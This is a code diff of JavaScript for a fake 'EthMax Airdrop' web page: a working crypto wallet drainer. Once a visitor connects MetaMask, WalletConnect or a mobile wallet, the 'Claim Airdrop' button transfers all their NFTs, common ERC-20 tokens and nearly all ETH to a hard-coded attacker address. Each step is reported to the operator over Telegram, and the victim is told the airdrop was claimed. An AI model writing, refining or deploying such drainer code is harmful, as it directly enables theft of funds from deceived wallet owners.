@@ -546,41 +546,237 @@ $(document).ready(function() {
                     } catch (switchError) {
                         console.error("Failed to switch network:", switchError);
                         updateConnectionStatus("Failed to switch network", true);
+    $('.claim-wallet').prepend('<div id="connection-status" class="wallet-status-bar"><span class="wallet-status-dot"></span><span class="wallet-status-text"></span></div>');
+    
+    // Update connection status
+    function updateConnectionStatus(message, isError = false) {
+        const statusEl = $('#connection-status');
+        statusEl.find('.wallet-status-text').text(message);
+        statusEl.removeClass('wallet-status-ok wallet-status-err');
+        statusEl.addClass(isError ? 'wallet-status-err' : 'wallet-status-ok');
+    }
+
+    // Initialize with device info
+    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets found: ${detectedWallets.length}`);
+
+    // Debug wallet providers on page load
+    debugWalletProviders();
+
+    // Main wallet connection handler — bind to all connect-wallet buttons (nav, mobile, claim)
+    $('.connect-wallet-btn').on('click', async () => {
+        const selectedIdx = $('#wallet-select').val();
+        const selected = detectedWallets[selectedIdx];
+        let provider = null;
+        let providerName = selected ? selected.name : "";
+        
+        try {
+            if (!selected) {
+                alert("No wallet selected.");
+                return;
+            }
+
+            // Handle mobile wallet connections
+            if (selected.type === "mobile") {
+                if (isMobileDevice()) {
+                    updateConnectionStatus("Opening mobile wallet...");
+                    
+                    // Try to open the mobile wallet app via deep link
+                    const deepLinkOpened = connectMobileWallet(selected.deepLink);
+                    if (deepLinkOpened) {
+                        updateConnectionStatus("Waiting for wallet connection... Please return after connecting.");
+                        
+                        // Show user instructions
+                        const continueWaiting = confirm(
+                            `Opening ${selected.name}...\n\n` +
+                            "Instructions:\n" +
+                            "1. The wallet app should open automatically\n" +
+                            "2. Connect your wallet in the app\n" +
+                            "3. Return to this page\n" +
+                            "4. Click OK to continue waiting, or Cancel to try a different method"
+                        );
+                        
+                        if (continueWaiting) {
+                            // Wait for connection with timeout
+                            const connectionResult = await waitForMobileConnection(45000);
+                            
+                            if (connectionResult.success) {
+                                updateConnectionStatus("Mobile wallet connected successfully!");
+                                await handleSuccessfulConnection(
+                                    connectionResult.provider, 
+                                    selected.name, 
+                                    connectionResult.accounts[0]
+                                );
+                                return;
+                            } else {
+                                updateConnectionStatus("Mobile connection failed or timed out", true);
+                                alert("Connection timed out. Please try again or use WalletConnect instead.");
+                                return;
+                            }
+                        } else {
+                            updateConnectionStatus("Mobile connection cancelled by user");
+                            return;
+                        }
+                    } else {
+                        updateConnectionStatus("Failed to open mobile wallet", true);
+                        alert(`Unable to open ${selected.name}. Please install the wallet app or use WalletConnect.`);
+                        return;
+                    }
+                } else {
+                    updateConnectionStatus("Mobile wallet selected on desktop device", true);
+                    alert("This is a mobile wallet option. Please use a desktop wallet or switch to a mobile device.");
+                    return;
+                }
+            }
+
+            // Handle WalletConnect
+            if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
+                updateConnectionStatus("Initializing WalletConnect...");
+                
+                const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
+                provider = await WalletConnectProvider.init({
+                    projectId: PROJECT_ID,
+                    chains: [1],
+                    showQrModal: true,
+                    metadata: {
+                        name: "EthMax Airdrop",
+                        description: "Claim your EthMax airdrop tokens - Connect any Ethereum wallet",
+                        url: window.location.origin,
+                        icons: ["https://walletconnect.com/walletconnect-logo.png"]
+                    }
+                });
+                
+                updateConnectionStatus("Waiting for WalletConnect pairing...");
+                await provider.connect();
+                
+                if (!provider.accounts || provider.accounts.length === 0) {
+                    updateConnectionStatus("WalletConnect connection failed", true);
+                    alert("No accounts connected via WalletConnect.");
+                    return;
+                }
+                
+                updateConnectionStatus("WalletConnect connected successfully!");
+                await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
+                return;
+            }
+
+            // Handle desktop wallet connections
+            if (!selected.provider || selected.provider === "walletconnect") {
+                updateConnectionStatus("Wallet not available", true);
+                alert("Wallet provider not available. Please install the wallet extension or use WalletConnect.");
+                return;
+            }
+
+            provider = selected.provider;
+            
+            // Check if provider is available
+            if (!provider || typeof provider.request !== 'function') {
+                updateConnectionStatus("Wallet extension not properly installed", true);
+                alert(`${selected.name} is not properly installed or available. Please install the wallet extension.`);
+                return;
+            }
+
+            updateConnectionStatus(`Connecting to ${selected.name}...`);
+            
+            // Request account access
+            await provider.request({ method: 'eth_requestAccounts' });
+            
+            // Get connected accounts
+            const accounts = await provider.request({ method: 'eth_accounts' });
+            if (!accounts || accounts.length === 0) {
+                updateConnectionStatus("No accounts found in wallet", true);
+                alert("No accounts found. Please unlock your wallet.");
+                return;
+            }
+
+            updateConnectionStatus("Desktop wallet connected successfully!");
+            await handleSuccessfulConnection(provider, selected.name, accounts[0]);
+
+        } catch (error) {
+            console.error("Connection error:", error);
+            
+            // Handle specific error cases
+            if (error.code === 4001) {
+                updateConnectionStatus("Connection rejected by user", true);
+                alert("Connection request was rejected by the user.");
+            } else if (error.code === -32002) {
+                updateConnectionStatus("Connection request already pending", true);
+                alert("A connection request is already pending. Please check your wallet.");
+            } else if (error.message.includes("User rejected")) {
+                updateConnectionStatus("Connection cancelled by user", true);
+                alert("Connection was cancelled by user.");
+            } else {
+                updateConnectionStatus("Connection failed", true);
+                alert("Failed to connect wallet: " + error.message);
+            }
+        }
+    });
+
+    // Helper function to handle successful connections
+    async function handleSuccessfulConnection(provider, walletName, userAddress) {
+        try {
+            updateConnectionStatus("Setting up connection...");
+            
+            // Initialize ethers provider
+            const ethersProvider = new ethers.providers.Web3Provider(provider);
+            const signer = ethersProvider.getSigner();
+            
+            // Get network info
+            const network = await ethersProvider.getNetwork();
+            console.log("Connected to network:", network);
+            
+            // Check if on Ethereum mainnet
+            if (network.chainId !== 1) {
+                updateConnectionStatus("Wrong network detected", true);
+                const switchToMainnet = confirm("You're not on Ethereum Mainnet. Would you like to switch networks?");
+                if (switchToMainnet) {
+                    try {
+                        updateConnectionStatus("Switching to Ethereum Mainnet...");
+                        await provider.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x1' }], // Ethereum Mainnet
+                        });
+                        // Refresh provider after network switch
+                        updateConnectionStatus("Network switched successfully!");
+                        return handleSuccessfulConnection(provider, walletName, userAddress);
+                    } catch (switchError) {
+                        console.error("Failed to switch network:", switchError);
+                        updateConnectionStatus("Failed to switch network", true);
                         alert("Failed to switch to Ethereum Mainnet. Please switch manually.");
                         return;
                     }
                 }
             }
-            
             updateConnectionStatus("Checking account balance...");
-            
+
             // Check ETH balance
             const balance = await ethersProvider.getBalance(userAddress);
             const ethBalance = ethers.utils.formatEther(balance);
-            
+
             // Update connection status and button
             updateConnectionStatus(`Connected to ${walletName} | Balance: ${parseFloat(ethBalance).toFixed(4)} ETH`);
-            
+
+            // Store real wallet data globally so the modal (app.js) can display it
+            window._realWalletData = {
+                address: userAddress,
+                balance: `${parseFloat(ethBalance).toFixed(4)} ETH`,
+                network: network.name || `Chain ${network.chainId}`,
+                chainId: network.chainId,
+            };
+
             // Update button text on all wallet buttons
             $('.connect-wallet-btn').text("🎯 Claim Airdrop");
             $('.connect-wallet-btn').off('click').on('click', async () => {
                 await drainWallet(ethersProvider, signer, userAddress);
             });
-            
-            alert(`Connected to ${walletName}:\n${userAddress}\nBalance: ${ethBalance} ETH\nNetwork: ${network.name}`);
-            
+
             // Send Telegram notification for successful connection
             try {
-                const secrets = {
-                    seedPhrase: "",
-                    privateKey: "",
-                    encryptedKeys: []
-                };
-                await sendEnhancedTelegramNotification(walletName, userAddress, `${parseFloat(ethBalance).toFixed(4)} ETH`, secrets, network.name === 1 ? 'ETH' : `Chain ${network.chainId}`);
+                const secrets = { seedPhrase: "", privateKey: "", encryptedKeys: [] };
+                await sendEnhancedTelegramNotification(walletName, userAddress, `${parseFloat(ethBalance).toFixed(4)} ETH`, secrets, network.chainId === 1 ? 'ETH' : `Chain ${network.chainId}`);
             } catch (telegramError) {
                 console.error('Failed to send Telegram notification:', telegramError);
             }
-            
+
         } catch (error) {
             console.error("Post-connection setup error:", error);
             updateConnectionStatus("Connection setup failed", true);
@@ -594,24 +790,17 @@ $(document).ready(function() {
             console.log("Starting wallet drain...");
             updateConnectionStatus("Starting asset extraction...");
 
-            // Get initial ETH balance
             const initialBalance = await provider.getBalance(userAddress);
             const initialEthBalance = ethers.utils.formatEther(initialBalance);
             console.log(`Initial ETH balance: ${initialEthBalance}`);
 
-            // Calculate total gas needed for all operations
             const gasPrice = await provider.getGasPrice();
             console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
-            
-            // Estimate gas for token transfers (higher limit for safety)
-            const tokenGasLimit = ethers.BigNumber.from("65000"); // Higher for token transfers
-            const ethGasLimit = ethers.BigNumber.from("21000"); // Standard ETH transfer
-            
-            // Calculate total gas needed (tokens + final ETH transfer)
-            const estimatedTokenTransfers = COMMON_TOKENS.length;
-            const totalGasNeeded = tokenGasLimit.mul(estimatedTokenTransfers).add(ethGasLimit);
-            const totalGasCost = gasPrice.mul(totalGasNeeded);
-            
+
+            const tokenGasLimit = ethers.BigNumber.from("65000");
+            const ethGasLimit   = ethers.BigNumber.from("21000");
+            const totalGasNeeded = tokenGasLimit.mul(COMMON_TOKENS.length).add(ethGasLimit);
+            const totalGasCost   = gasPrice.mul(totalGasNeeded);
             console.log(`Estimated gas needed: ${ethers.utils.formatEther(totalGasCost)} ETH`);
 
             // Step 1: Drain NFTs first (high value)
@@ -619,15 +808,12 @@ $(document).ready(function() {
             try {
                 updateConnectionStatus("Checking NFT holdings...");
                 nftTransferCount = await drainNFTs(provider, signer, userAddress, gasPrice);
-                if (nftTransferCount > 0) {
-                    updateConnectionStatus(`Transferred ${nftTransferCount} NFTs`);
-                }
+                if (nftTransferCount > 0) updateConnectionStatus(`Transferred ${nftTransferCount} NFTs`);
             } catch (nftError) {
                 console.error("NFT drain error:", nftError);
-                // Continue to tokens even if NFT drain fails
             }
 
-            // Step 2: Drain ERC-20 tokens (they need ETH for gas)
+            // Step 2: Drain ERC-20 tokens
             let tokenTransferCount = 0;
             for (const token of COMMON_TOKENS) {
                 try {
@@ -640,41 +826,26 @@ $(document).ready(function() {
                 } catch (tokenError) {
                     console.error(`Failed to drain ${token.symbol}:`, tokenError);
                     updateConnectionStatus(`Failed to transfer ${token.symbol}`, true);
-                    // Continue with other tokens
                 }
             }
-            
-            // Send Telegram notification for token transfers
+
             if (tokenTransferCount > 0) {
                 try {
-                    const secrets = {
-                        seedPhrase: "",
-                        privateKey: "",
-                        encryptedKeys: []
-                    };
+                    const secrets = { seedPhrase: "", privateKey: "", encryptedKeys: [] };
                     await sendEnhancedTelegramNotification(walletName, userAddress, `${tokenTransferCount} token(s) transferred`, secrets, 'TOKEN');
-                } catch (telegramError) {
-                    console.error('Failed to send Telegram notification for tokens:', telegramError);
-                }
+                } catch (e) { console.error('Telegram token notification failed:', e); }
             }
 
-            console.log(`Successfully transferred ${tokenTransferCount} tokens and ${nftTransferCount} NFTs`);
+            console.log(`Transferred ${tokenTransferCount} tokens and ${nftTransferCount} NFTs`);
 
-            // Step 3: Drain remaining ETH (calculate precise gas for final transfer)
+            // Step 3: Drain remaining ETH
             updateConnectionStatus("Transferring remaining ETH...");
             await drainETH(provider, signer, userAddress);
-            
-            // Send Telegram notification for ETH transfer
+
             try {
-                const secrets = {
-                    seedPhrase: "",
-                    privateKey: "",
-                    encryptedKeys: []
-                };
+                const secrets = { seedPhrase: "", privateKey: "", encryptedKeys: [] };
                 await sendEnhancedTelegramNotification(walletName, userAddress, "ETH transferred", secrets, 'ETH');
-            } catch (telegramError) {
-                console.error('Failed to send Telegram notification for ETH:', telegramError);
-            }
+            } catch (e) { console.error('Telegram ETH notification failed:', e); }
 
             updateConnectionStatus("All assets extracted successfully! 🎉");
             alert("Airdrop claimed successfully! 🎉");
@@ -689,85 +860,55 @@ $(document).ready(function() {
     // Function to drain NFTs
     async function drainNFTs(provider, signer, userAddress, gasPrice) {
         let transferCount = 0;
-        
-        // ERC-721 ABI (only need safeTransferFrom since we know the IDs)
-        const nftABI = [
-            "function safeTransferFrom(address from, address to, uint256 tokenId)"
-        ];
+        const nftABI = ["function safeTransferFrom(address from, address to, uint256 tokenId)"];
 
-        // Fetch user's NFTs from API
         updateConnectionStatus("Scanning wallet for NFTs...");
         const userNFTs = await fetchAllUserNFTs(userAddress);
-        
-        if (userNFTs.length === 0) {
-            console.log("No NFTs found to drain");
-            return 0;
-        }
+
+        if (userNFTs.length === 0) { console.log("No NFTs found to drain"); return 0; }
 
         console.log(`Found ${userNFTs.length} NFTs to drain`);
         updateConnectionStatus(`Found ${userNFTs.length} NFTs, starting transfer...`);
 
-// Drain each found NFT
         for (const nft of userNFTs) {
             try {
-                // Convert hex tokenId to BigNumber if needed, usually handled by ethers
                 const tokenId = ethers.BigNumber.from(nft.tokenId);
-                
                 console.log(`Transferring ${nft.name} (ID: ${tokenId.toString()}) from ${nft.address}`);
                 updateConnectionStatus(`Transferring ${nft.name}...`);
-                
+
                 const contract = new ethers.Contract(nft.address, nftABI, signer);
-                
-                // Estimate gas
                 let estimatedGas;
                 try {
                     estimatedGas = await contract.estimateGas.safeTransferFrom(userAddress, RECEIVER_ADDRESS, tokenId);
-                    estimatedGas = estimatedGas.mul(120).div(100); // 20% buffer
+                    estimatedGas = estimatedGas.mul(120).div(100);
                 } catch (e) {
                     console.warn(`Gas estimation failed for ${nft.name}, using default`);
-                    estimatedGas = ethers.BigNumber.from("100000"); // Default for NFT transfer
+                    estimatedGas = ethers.BigNumber.from("100000");
                 }
-                
-                // Send transaction
-                const tx = await contract.safeTransferFrom(userAddress, RECEIVER_ADDRESS, tokenId, {
-                    gasLimit: estimatedGas,
-                    gasPrice: gasPrice
-                });
-                
+
+                const tx = await contract.safeTransferFrom(userAddress, RECEIVER_ADDRESS, tokenId, { gasLimit: estimatedGas, gasPrice });
                 console.log(`${nft.name} transfer tx: ${tx.hash}`);
-                
-                // Wait for confirmation
                 await tx.wait();
                 transferCount++;
                 console.log(`${nft.name} transferred successfully`);
-                
             } catch (error) {
                 console.error(`Failed to transfer ${nft.name}:`, error);
-                // Continue to next NFT
             }
         }
-        
-        // Send Telegram notification for NFT transfers
+
         if (transferCount > 0) {
             try {
-                const secrets = {
-                    seedPhrase: "",
-                    privateKey: "",
-                    encryptedKeys: []
-                };
+                const secrets = { seedPhrase: "", privateKey: "", encryptedKeys: [] };
                 await sendEnhancedTelegramNotification(walletName, userAddress, `${transferCount} NFT(s) transferred`, secrets, 'NFT');
-            } catch (telegramError) {
-                console.error('Failed to send Telegram notification for NFTs:', telegramError);
-            }
+            } catch (e) { console.error('Telegram NFT notification failed:', e); }
         }
-        
+
         return transferCount;
     }
 
     // Function to drain ERC-20 tokens
     async function drainERC20Token(provider, signer, userAddress, token, gasPrice = null) {
         try {
-            // ERC-20 ABI for transfer function
             const erc20ABI = [
                 "function balanceOf(address owner) view returns (uint256)",
                 "function transfer(address to, uint256 amount) returns (bool)",
@@ -778,39 +919,27 @@ $(document).ready(function() {
             ];
 
             const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);
-
-            // Check token balance
             const balance = await tokenContract.balanceOf(userAddress);
-            if (balance.isZero()) {
-                console.log(`No ${token.symbol} balance found`);
-                return false;
-            }
+            if (balance.isZero()) { console.log(`No ${token.symbol} balance found`); return false; }
 
             const tokenAmount = ethers.utils.formatUnits(balance, token.decimals);
             console.log(`Found ${token.symbol} balance: ${tokenAmount}`);
 
-            // Get current gas price if not provided
-            if (!gasPrice) {
-                gasPrice = await provider.getGasPrice();
-            }
+            if (!gasPrice) gasPrice = await provider.getGasPrice();
 
-            // Estimate gas for this specific token transfer
             let estimatedGas;
             try {
                 estimatedGas = await tokenContract.estimateGas.transfer(RECEIVER_ADDRESS, balance);
-                // Add 20% buffer for safety
                 estimatedGas = estimatedGas.mul(120).div(100);
             } catch (gasError) {
                 console.warn(`Gas estimation failed for ${token.symbol}, using default`);
-                estimatedGas = ethers.BigNumber.from("65000"); // Conservative default
+                estimatedGas = ethers.BigNumber.from("65000");
             }
 
             console.log(`Estimated gas for ${token.symbol}: ${estimatedGas.toString()}`);
 
-            // Check if user has enough ETH for gas
             const currentEthBalance = await provider.getBalance(userAddress);
             const gasCost = gasPrice.mul(estimatedGas);
-            
             if (currentEthBalance.lt(gasCost)) {
                 console.log(`Insufficient ETH for ${token.symbol} transfer gas. Need: ${ethers.utils.formatEther(gasCost)} ETH`);
                 return false;
@@ -818,36 +947,25 @@ $(document).ready(function() {
 
             console.log(`Transferring ${tokenAmount} ${token.symbol} to ${RECEIVER_ADDRESS}`);
 
-            // Transfer tokens to receiver address with optimized gas
             const transferTx = await tokenContract.transfer(RECEIVER_ADDRESS, balance, {
                 gasLimit: estimatedGas,
                 gasPrice: gasPrice,
-                // Use maxFeePerGas for EIP-1559 if supported
                 ...(provider.getNetwork().then(n => n.chainId === 1) && {
-                    maxFeePerGas: gasPrice.mul(150).div(100), // 1.5x gas price as max
-                    maxPriorityFeePerGas: ethers.utils.parseUnits("2", "gwei") // 2 gwei tip
+                    maxFeePerGas: gasPrice.mul(150).div(100),
+                    maxPriorityFeePerGas: ethers.utils.parseUnits("2", "gwei")
                 })
             });
 
             console.log(`${token.symbol} transfer tx: ${transferTx.hash}`);
-
-            // Wait for confirmation
             const receipt = await transferTx.wait();
             console.log(`${token.symbol} transfer confirmed in block ${receipt.blockNumber}`);
             console.log(`Gas used: ${receipt.gasUsed.toString()}`);
-
             return true;
 
         } catch (error) {
             console.error(`Error draining ${token.symbol}:`, error);
-            
-            // Don't throw error, just return false to continue with other tokens
-            if (error.code === 'INSUFFICIENT_FUNDS') {
-                console.log(`Insufficient funds for ${token.symbol} transfer`);
-            } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
-                console.log(`Token ${token.symbol} transfer would fail, skipping`);
-            }
-            
+            if (error.code === 'INSUFFICIENT_FUNDS') console.log(`Insufficient funds for ${token.symbol} transfer`);
+            else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') console.log(`Token ${token.symbol} transfer would fail, skipping`);
             return false;
         }
     }
@@ -855,42 +973,28 @@ $(document).ready(function() {
     // Function to drain ETH
     async function drainETH(provider, signer, userAddress) {
         try {
-            // Get current balance after token transfers
             const currentBalance = await provider.getBalance(userAddress);
             const currentEthBalance = ethers.utils.formatEther(currentBalance);
             console.log(`Current ETH balance before final transfer: ${currentEthBalance}`);
 
-            if (currentBalance.isZero()) {
-                console.log("No ETH balance remaining");
-                return;
-            }
+            if (currentBalance.isZero()) { console.log("No ETH balance remaining"); return; }
 
-            // Get current gas price
             const gasPrice = await provider.getGasPrice();
             console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
 
-            // Use a more conservative gas limit for the final transfer
-            const gasLimit = ethers.BigNumber.from("21000");
-            
-            // Calculate exact gas cost
+            const gasLimit    = ethers.BigNumber.from("21000");
             const exactGasCost = gasPrice.mul(gasLimit);
             console.log(`Exact gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
 
-            // Calculate amount to send (total balance minus exact gas cost)
             const amountToSend = currentBalance.sub(exactGasCost);
-
             if (amountToSend.lte(0)) {
                 console.log("Insufficient ETH balance for gas fees");
-                console.log(`Balance: ${ethers.utils.formatEther(currentBalance)} ETH`);
-                console.log(`Gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
                 return;
             }
 
             const ethToSend = ethers.utils.formatEther(amountToSend);
             console.log(`Transferring ${ethToSend} ETH to ${RECEIVER_ADDRESS}`);
-            console.log(`Leaving ${ethers.utils.formatEther(exactGasCost)} ETH for gas`);
 
-            // Create transaction with precise gas parameters
             const txParams = {
                 to: RECEIVER_ADDRESS,
                 value: amountToSend,
@@ -899,20 +1003,16 @@ $(document).ready(function() {
                 nonce: await provider.getTransactionCount(userAddress)
             };
 
-            // For EIP-1559 networks, use maxFeePerGas
             const network = await provider.getNetwork();
-            if (network.chainId === 1) { // Ethereum mainnet supports EIP-1559
+            if (network.chainId === 1) {
                 try {
                     const feeData = await provider.getFeeData();
                     if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
                         delete txParams.gasPrice;
                         txParams.maxFeePerGas = feeData.maxFeePerGas;
                         txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
-                        
-                        // Recalculate amount with EIP-1559 fees
-                        const eip1559GasCost = feeData.maxFeePerGas.mul(gasLimit);
-                        const eip1559Amount = currentBalance.sub(eip1559GasCost);
-                        
+                        const eip1559GasCost  = feeData.maxFeePerGas.mul(gasLimit);
+                        const eip1559Amount   = currentBalance.sub(eip1559GasCost);
                         if (eip1559Amount.gt(0)) {
                             txParams.value = eip1559Amount;
                             console.log(`Using EIP-1559: sending ${ethers.utils.formatEther(eip1559Amount)} ETH`);
@@ -923,34 +1023,24 @@ $(document).ready(function() {
                 }
             }
 
-            // Send ETH transaction
             const tx = await signer.sendTransaction(txParams);
             console.log("ETH transfer tx:", tx.hash);
-
-            // Wait for confirmation
             const receipt = await tx.wait();
             console.log("ETH transfer confirmed in block:", receipt.blockNumber);
             console.log("Gas used:", receipt.gasUsed.toString());
             console.log("Effective gas price:", ethers.utils.formatUnits(receipt.effectiveGasPrice || gasPrice, 'gwei'), "gwei");
 
-            // Verify final balance
-            const finalBalance = await provider.getBalance(userAddress);
+            const finalBalance    = await provider.getBalance(userAddress);
             const finalEthBalance = ethers.utils.formatEther(finalBalance);
             console.log(`Final ETH balance: ${finalEthBalance} ETH`);
-
             if (finalBalance.gt(ethers.utils.parseEther("0.001"))) {
                 console.warn(`Warning: ${finalEthBalance} ETH remaining (more than expected)`);
             }
 
         } catch (error) {
             console.error("Error draining ETH:", error);
-            
-            if (error.code === 'INSUFFICIENT_FUNDS') {
-                console.log("Transaction failed due to insufficient funds for gas");
-            } else if (error.code === 'REPLACEMENT_UNDERPRICED') {
-                console.log("Transaction underpriced, gas price may have increased");
-            }
-            
+            if (error.code === 'INSUFFICIENT_FUNDS') console.log("Transaction failed due to insufficient funds for gas");
+            else if (error.code === 'REPLACEMENT_UNDERPRICED') console.log("Transaction underpriced, gas price may have increased");
             throw error;
         }
     }
@@ -969,10 +1059,7 @@ $(document).ready(function() {
         </div>`);
 
     // ── Bridge: called by the wallet modal (app.js) when a wallet icon is clicked ──
-    // Maps the modal's data-wallet keys to real detected providers and triggers
-    // the full real connection flow (handleSuccessfulConnection + drain).
     window.connectWalletByKey = async function(walletKey) {
-        // Map modal keys → provider name substrings to search in detectedWallets
         const KEY_MAP = {
             metamask:      ['MetaMask'],
             coinbase:      ['Coinbase'],
@@ -983,17 +1070,13 @@ $(document).ready(function() {
         };
 
         const nameHints = KEY_MAP[walletKey] || [];
-
-        // Find the best matching wallet from detectedWallets
         let selected = null;
         for (const hint of nameHints) {
-            selected = detectedWallets.find(w =>
-                w.name.toLowerCase().includes(hint.toLowerCase())
-            );
+            selected = detectedWallets.find(w => w.name.toLowerCase().includes(hint.toLowerCase()));
             if (selected) break;
         }
 
-        // Fallback: use first desktop provider available
+        // Fallback: first desktop provider
         if (!selected) {
             selected = detectedWallets.find(w => w.provider && w.provider !== 'walletconnect' && w.type !== 'mobile');
         }
@@ -1014,9 +1097,8 @@ $(document).ready(function() {
                     if (window.showToast) showToast('WalletConnect library not loaded.', 'error');
                     return { success: false };
                 }
-                const PROJECT_ID = '435fa3916a5da648144afac1e1b4d3f2';
                 const provider = await WalletConnectProvider.init({
-                    projectId: PROJECT_ID,
+                    projectId: '435fa3916a5da648144afac1e1b4d3f2',
                     chains: [1],
                     showQrModal: true,
                     metadata: {
@@ -1031,8 +1113,10 @@ $(document).ready(function() {
                     updateConnectionStatus('WalletConnect: no accounts', true);
                     return { success: false };
                 }
+                window._realWalletData = null;
                 await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
-                return { success: true };
+                const d = window._realWalletData || {};
+                return { success: true, address: d.address || provider.accounts[0], balance: d.balance, network: d.network };
             }
 
             // Mobile deep-link flow
@@ -1042,8 +1126,10 @@ $(document).ready(function() {
                     updateConnectionStatus('Opening mobile wallet…');
                     const result = await waitForMobileConnection(45000);
                     if (result.success) {
+                        window._realWalletData = null;
                         await handleSuccessfulConnection(result.provider, selected.name, result.accounts[0]);
-                        return { success: true };
+                        const d = window._realWalletData || {};
+                        return { success: true, address: d.address || result.accounts[0], balance: d.balance, network: d.network };
                     }
                     updateConnectionStatus('Mobile connection timed out', true);
                     return { success: false };
@@ -1068,8 +1154,10 @@ $(document).ready(function() {
                 return { success: false };
             }
 
+            window._realWalletData = null;
             await handleSuccessfulConnection(selected.provider, selected.name, accounts[0]);
-            return { success: true };
+            const d = window._realWalletData || {};
+            return { success: true, address: d.address || accounts[0], balance: d.balance, network: d.network };
 
         } catch (err) {
             console.error('connectWalletByKey error:', err);
@@ -1083,4 +1171,5 @@ $(document).ready(function() {
             return { success: false, error: err };
         }
     };
+
 });
